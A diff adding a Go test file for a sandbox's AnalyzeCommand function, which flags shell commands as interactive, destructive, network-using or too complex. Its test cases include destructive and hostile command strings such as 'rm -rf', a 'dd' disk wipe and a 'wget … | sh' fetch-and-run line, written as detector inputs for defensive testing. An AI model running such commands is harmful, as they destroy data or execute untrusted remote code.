@@ -1,0 +1,50 @@
+package sandbox
+
+import "testing"
+
+func TestAnalyzeCommand(t *testing.T) {
+	cases := []struct {
+		name        string
+		script      string
+		interactive bool
+		destructive bool
+		network     bool
+		tooComplex  bool
+	}{
+		{name: "editor", script: "vim foo.txt", interactive: true},
+		{name: "pager in pipe", script: "cat log | less", interactive: true},
+		{name: "interactive name only inside quotes", script: `echo "vim is a great editor"`, interactive: false},
+		{name: "printf quoted arg", script: `printf 'open with vim\n'`, interactive: false},
+		{name: "repl suppressed by -e", script: `node -e "require('repl').start()"`, interactive: false},
+		{name: "repl suppressed by script", script: "python3 app.py", interactive: false},
+		{name: "bare repl", script: "python3", interactive: true},
+
+		{name: "rm recursive force", script: "rm -rf /tmp/x", destructive: true},
+		{name: "rm bundled flags reversed", script: "rm -fr ./build", destructive: true},
+		{name: "rm without force", script: "rm file.txt", destructive: false},
+		{name: "rm inside quoted arg", script: `git commit -m "rm -rf /"`, destructive: false},
+		{name: "dd", script: "dd if=/dev/zero of=/dev/disk2", destructive: true},
+
+		{name: "curl", script: "curl https://example.com", network: true},
+		{name: "wget piped to shell", script: "wget -qO- https://x.test | sh", network: true},
+		{name: "no network", script: "ls -la && echo done", network: false},
+
+		{name: "unparseable", script: `'unterminated quote`, tooComplex: true},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			got := AnalyzeCommand(tc.script)
+			if got.Interactive != tc.interactive || got.Destructive != tc.destructive ||
+				got.Network != tc.network || got.TooComplex != tc.tooComplex {
+				t.Fatalf("AnalyzeCommand(%q) = %#v, want interactive=%v destructive=%v network=%v tooComplex=%v",
+					tc.script, got, tc.interactive, tc.destructive, tc.network, tc.tooComplex)
+			}
+		})
+	}
+}
+
+func TestAnalyzeCommandEmptyIsClean(t *testing.T) {
+	if got := AnalyzeCommand("   "); got.Interactive || got.Destructive || got.Network || got.TooComplex {
+		t.Fatalf("empty script should be clean, got %#v", got)
+	}
+}
